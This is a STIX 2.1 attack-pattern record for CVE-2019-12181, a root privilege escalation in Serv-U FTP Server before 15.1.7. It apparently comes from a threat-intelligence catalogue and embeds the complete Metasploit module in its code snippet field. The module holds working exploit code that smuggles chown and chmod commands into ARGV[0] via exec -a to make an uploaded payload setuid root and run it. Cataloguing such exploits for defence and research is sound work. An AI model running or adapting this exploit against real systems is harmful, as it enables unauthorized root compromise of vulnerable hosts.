{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5f22143b-0441-44c4-89aa-09b2751d0884",
    "created": "2024-08-14T16:59:02.000784Z",
    "modified": "2024-08-14T16:59:02.000788Z",
    "name": "Serv-U FTP Server prepareinstallation Privilege Escalation",
    "description": " This module attempts to gain root privileges on systems running Serv-U FTP Server versions prior to 15.1.7.  The `Serv-U` executable is setuid `root`, and uses `ARGV[0]` in a call to `system()`, without validation, when invoked with the `-prepareinstallation` flag, resulting in command execution with root privileges.  This module has been tested successfully on Serv-U FTP Server version 15.1.6 (x64) on Debian 9.6 (x64).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/servu_ftp_server_prepareinstallation_priv_esc.rb",
            "external_id": "servu_ftp_server_prepareinstallation_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-12181"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/guywhataguy/CVE-2019-12181"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/bcoles/local-exploits/tree/master/CVE-2019-12181"
        },
        {
            "source_name": "reference",
            "url": "https://blog.vastart.dev/2019/06/cve-2019-12181-serv-u-exploit-writeup.html"
        },
        {
            "source_name": "reference",
            "url": "https://documentation.solarwinds.com/en/success_center/servu/Content/Release_Notes/Servu_15-1-7_release_notes.htm"
        },
        {
            "source_name": "reference",
            "url": "https://support.solarwinds.com/SuccessCenter/s/article/Serv-U-Potential-elevation-of-privileges-on-Linux-systems"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Kernel\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Serv-U FTP Server prepareinstallation Privilege Escalation',\n        'Description' => %q{\n          This module attempts to gain root privileges on systems running\n          Serv-U FTP Server versions prior to 15.1.7.\n\n          The `Serv-U` executable is setuid `root`, and uses `ARGV[0]`\n          in a call to `system()`, without validation, when invoked with\n          the `-prepareinstallation` flag, resulting in command execution\n          with root privileges.\n\n          This module has been tested successfully on Serv-U FTP Server\n          version 15.1.6 (x64) on Debian 9.6 (x64).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Guy Levin', # @va_start - Discovery and exploit\n          'bcoles'     # Metasploit\n        ],\n        'DisclosureDate' => '2019-06-05',\n        'References' => [\n          ['CVE', '2019-12181'],\n          ['EDB', '47009'],\n          ['PACKETSTORM', '153333'],\n          ['URL', 'https://github.com/guywhataguy/CVE-2019-12181'],\n          ['URL', 'https://github.com/bcoles/local-exploits/tree/master/CVE-2019-12181'],\n          ['URL', 'https://blog.vastart.dev/2019/06/cve-2019-12181-serv-u-exploit-writeup.html'],\n          ['URL', 'https://documentation.solarwinds.com/en/success_center/servu/Content/Release_Notes/Servu_15-1-7_release_notes.htm'],\n          ['URL', 'https://support.solarwinds.com/SuccessCenter/s/article/Serv-U-Potential-elevation-of-privileges-on-Linux-systems']\n        ],\n        'Platform' => ['linux'],\n        'Arch' => [\n          ARCH_X86,\n          ARCH_X64,\n          ARCH_ARMLE,\n          ARCH_AARCH64,\n          ARCH_PPC,\n          ARCH_MIPSLE,\n          ARCH_MIPSBE\n        ],\n        'SessionTypes' => ['shell', 'meterpreter'],\n        'Targets' => [['Auto', {}]],\n        'DefaultOptions' => {\n          'PrependSetresuid' => true,\n          'PrependSetresgid' => true,\n          'PrependFork' => true,\n          'WfsDelay' => 30\n        },\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SAFE ]\n        },\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n            ]\n          }\n        }\n      )\n    )\n    register_options [\n      OptString.new('SERVU_PATH', [true, 'Path to Serv-U executable', '/usr/local/Serv-U/Serv-U'])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ]\n  end\n\n  def servu_path\n    datastore['SERVU_PATH']\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def upload_and_chmodx(path, data)\n    upload path, data\n    chmod path\n  end\n\n  def check\n    return CheckCode::Safe('bash shell is not available') unless command_exists? 'bash'\n\n    vprint_good 'bash shell is available'\n\n    return CheckCode::Safe(\"#{servu_path} file not found\") unless file? servu_path\n\n    return CheckCode::Safe(\"#{servu_path} is not executable\") unless executable?(servu_path)\n\n    vprint_good \"#{servu_path} is executable\"\n\n    return CheckCode::Safe(\"#{servu_path} is not setuid\") unless setuid? servu_path\n\n    vprint_good \"#{servu_path} is setuid\"\n\n    CheckCode::Detected\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    if nosuid? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is mounted nosuid\"\n    end\n\n    payload_name = \".#{rand_text_alphanumeric 10..15}\"\n    @payload_path = \"#{base_dir}/#{payload_name}\"\n    upload_and_chmodx @payload_path, generate_payload_exe\n\n    argv0 = %(\\\\\";chown root #{@payload_path};chmod u+s #{@payload_path};chmod +x #{@payload_path}\\\\\")\n    cmd = %(bash -c 'exec -a \"#{argv0}\" #{servu_path} -prepareinstallation')\n    vprint_status \"Executing command: #{cmd}\"\n    cmd_exec cmd\n\n    unless setuid? @payload_path\n      fail_with Failure::Unknown, 'Failed to set payload setuid root'\n    end\n    print_good \"#{@payload_path} setuid root successfully\"\n\n    print_status 'Executing payload...'\n    res = cmd_exec \"#{@payload_path} &\"\n    vprint_line res\n  end\n\n  def on_new_session(session)\n    if session.type.eql? 'meterpreter'\n      session.core.use 'stdapi' unless session.ext.aliases.include? 'stdapi'\n      session.fs.file.rm @payload_path\n    else\n      session.shell_command_token \"rm -f '#{@payload_path}'\"\n    end\n  ensure\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-06-05",
    "x_mitre_platforms": [
        "['linux']"
    ]
}